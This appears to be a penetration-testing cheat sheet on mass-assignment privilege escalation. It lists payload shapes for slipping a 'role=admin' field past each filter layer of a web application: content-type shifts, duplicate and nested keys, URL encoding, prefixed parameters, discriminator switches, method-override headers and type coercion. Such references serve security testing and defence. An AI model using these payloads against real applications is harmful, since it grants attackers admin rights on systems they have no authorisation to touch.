# Evasion deep — reaching the binder through every filter

## The filter positions, in order

```
client JS  →  WAF/proxy  →  content-parser  →  schema  →  binder  →  model
   │             │              │             │          │          │
 strips      param          unknown       strict      allowlist   readonly
 extras      allowlist      property      schema      drop        fields
```

Each position is bypassable differently; the bypass at one position
doesn't defeat the next.

## Position 1 — client JS

The JS builds `{username, password}` — `role` isn't sent because the
CODE excludes it. Bypass: send the raw request. JS constraints are
client-side fiction — `curl` doesn't run the page's filtering.

## Position 2 — WAF/param allowlist

| Technique | The shape |
|---|---|
| content-type shift | `role` JSON-blocked → `role=admin` form |
| case | `Role`, `ROLE` — case-insensitive binders |
| duplicate | `{"role":"user","role":"admin"}` — filter reads first, binder last |
| nested | `{"profile":{"role":..}}` — filter checks top-level |
| array | `role=["admin"]`, `role[]=admin` — scalar-only filters |
| encoding | `%72ole=admin`, `ro%6Ce` — decoder-vs-binder differential |

## Position 3 — content-parser

The parser's schema (`additionalProperties:false`, `extra:forbid`,
`.strict()`) rejects extras — but the SAME model bound through the form
path uses a different parser. `curl -d 'role=admin'` vs `curl -d
'{"role":"admin"}'` — two parsers, one model.

## Position 4 — the schema layer

Strict JSON schema rejects `role` — but the form binder may not run
the schema. Also: `{"user":{"role":..}}` — the schema validates `user`
as an OBJECT, not its contents; the nested merge reaches the field.

## Position 5 — the binder allowlist

`permit`/`$fillable`/`pick` drops flat `role` — the tunnels:

- **nested under allowed parent**: `{"profile":{"role":..}}`,
  `{"settings":{"admin":..}}` — the allowlist covers the parent; the
  deep merge reaches the nested field;
- **prefixed params**: `user[role]=admin`, `user.role=admin` — Rails/
  .NET conventions reaching nested fields;
- **array wrap**: `roles:["admin"]`, `groups:[{id:1}]` — the scalar
  filter accepts the typed variant;
- **discriminator**: `_t:"AdminUser"` — switches the schema to the
  privileged variant.

## Position 6 — the model readonly

`attr_readonly`, `readOnly`, frozen columns — the last line. The
nested-association binder reaches the CHILD model's writable fields
through the parent's accepted key — `user[profile_attributes][role]`
or `{"membership":{"role":..}}` where `role` is readonly on `user` but
writable on `membership`.

## The method-override carrier

`POST` + `X-HTTP-Method-Override:PUT` or `?_method=PATCH` — POST's
validation routes through PUT's handler; different allowlists on the
two methods make the override a carrier.

## The type-coercion tunnel

`role:true` filtered but `role:"admin"` binds; `groups:"admin"`
rejected but `groups:[{"id":1}]` binds. The model's TYPE is a second
filter — the typed variant reaches what the wrong-type misses.
